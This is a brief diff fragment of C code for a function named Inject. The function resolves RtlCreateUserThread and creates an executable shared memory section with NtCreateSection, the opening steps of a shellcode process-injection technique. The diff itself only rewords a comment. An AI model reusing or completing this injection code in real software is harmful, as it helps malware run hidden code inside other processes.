@@ -161,7 +161,7 @@ int Inject(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode_len)
     RtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
     if(RtlCreateUserThread == NULL) return -1;
 
-    // Create section that can be shared betwwen processes.
+    // Create section object in the process.
     NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcode_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
     // Create local section view.
